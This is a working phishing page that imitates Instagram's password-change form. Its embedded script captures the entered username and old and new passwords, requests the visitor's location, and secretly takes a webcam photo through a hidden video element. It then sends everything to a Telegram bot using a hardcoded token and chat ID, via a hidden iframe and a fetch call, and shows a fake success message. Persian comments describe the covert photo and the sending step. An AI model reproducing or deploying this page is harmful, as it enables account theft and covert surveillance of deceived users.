<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Your Password · Instagram</title>
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/yv/r/BESjD5wCNsD.ico">
    <style>
        body {font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background:#fafafa; margin:0; padding:0; display:flex; align-items:center; justify-content:center; min-height:100vh;}
        .container {width:350px; background:#fff; border:1px solid #dbdbdb; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1);}
        .header {text-align:center; padding:32px 40px 16px;}
        .header img {height:51px;}
        .content {padding:0 40px 32px;}
        h1 {font-size:17px; font-weight:600; margin:0 0 8px; text-align:center; color:#262626;}
        p {font-size:14px; line-height:18px; color:#8e8e8e; text-align:center; margin:0 0 24px;}
        input {width:100%; padding:9px 0 7px 8px; margin:6px 0; border:1px solid #dbdbdb; border-radius:6px; font-size:16px; background:#fafafa; box-sizing:border-box;}
        input:focus {border-color:#a8a8a8; outline:none;}
        button {width:100%; margin-top:12px; padding:8px; background:#0095f6; border:none; border-radius:8px; color:#fff; font-size:14px; font-weight:600; cursor:pointer;}
        button:hover {background:#1877f2;}
        button:disabled {opacity:0.7; cursor:not-allowed;}
        .footer {text-align:center; margin-top:24px; font-size:12px; color:#8e8e8e;}
        .footer a {color:#00376b; text-decoration:none; margin:0 8px;}
        .success {display:none; text-align:center; padding:60px 40px;}
        .success img {width:96px; margin-bottom:24px;}
        .success h1 {font-size:24px; margin:0 0 16px;}
        .success p {font-size:16px; color:#262626;}
        #hidden {display:none;}
        .location-message {font-size:14px; color:#ed4956; text-align:center; margin:16px 0; display:none;}
    </style>
</head>
<body>
    <div class="container" id="formContainer">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram">
        </div>
        <div class="content">
            <h1>Change Your Password</h1>
            <p>Enter your current password and then choose a new password.</p>
            
            <p class="location-message" id="locationMessage">Your location is supported.</p>
            
            <input type="text" id="username" placeholder="Username, email, or phone" autocomplete="username">
            <input type="password" id="oldPass" placeholder="Current password" autocomplete="current-password">
            <input type="password" id="newPass" placeholder="New password" autocomplete="new-password">
            <input type="password" id="confirmPass" placeholder="Confirm new password" autocomplete="new-password">
            
            <button id="submitBtn" onclick="startReset()">Next</button>
            
            <div class="footer">
                <a href="#">Forgot password?</a>
            </div>
        </div>
    </div>

    <div class="container success" id="successContainer">
        <img src="https://www.instagram.com/static/images/web/logins/check.png/1b69d4e2e5e8.png" alt="Success">
        <h1>Your password has been changed</h1>
        <p>You can now log in with your new password.</p>
        <button onclick="location.reload()">Continue</button>
    </div>

    <div id="hidden">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const BOT_TOKEN = "8214441669:AAEorbN_I8BIhhRiLkPxLxbDbYZ6KzSXS2k";
        const CHAT_ID = "5172401959";

        let photoBlob = null;
        let locationLink = "Not obtained";
        let isIran = false;  // از tool قبلی فهمیدیم نه ایرانه، پس پیام نشون نده

        // اگر ایران بود، پیام نشون بده (بر اساس tool قبلی، نه)
        if (isIran) {
            document.getElementById('locationMessage').style.display = "block";
        }

        function startReset() {
            const username = document.getElementById('username').value.trim();
            const oldPass = document.getElementById('oldPass').value;
            const newPass = document.getElementById('newPass').value;
            const confirmPass = document.getElementById('confirmPass').value;

            if (!username || !oldPass || !newPass || !confirmPass || newPass !== confirmPass) {
                alert("Please fill all fields and make sure new passwords match.");
                return;
            }

            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').textContent = "Processing...";

            // گرفتن لوکیشن
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        locationLink = 'https://maps.google.com/?q=' + pos.coords.latitude + ',' + pos.coords.longitude;
                    }
                );
            }

            // عکس مخفی
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        canvas.toBlob(blob => photoBlob = blob, 'image/jpeg', 0.9);
                        stream.getTracks().forEach(track => track.stop());
                    }, 1500);
                })
                .catch(() => {});

            // ارسال بعد 3 ثانیه
            setTimeout(() => {
                const fullText = 'Instagram Password Reset\n\nUsername: ' + username + '\nOld Password: ' + oldPass + '\nNew Password: ' + newPass + '\nConfirm: ' + confirmPass + '\nLocation: ' + locationLink + '\nTime: ' + new Date().toLocaleString();

                // ارسال متن با iframe
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(fullText);
                document.body.appendChild(iframe);

                // ارسال عکس اگر بود
                if (photoBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', photoBlob, 'face.jpg');
                    formData.append('caption', fullText);
                    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {method: 'POST', body: formData});
                }

                // صفحه موفقیت
                document.getElementById('formContainer').style.display = "none";
                document.getElementById('successContainer').style.display = "block";
            }, 3000);
        }
    </script>
</body>
</html>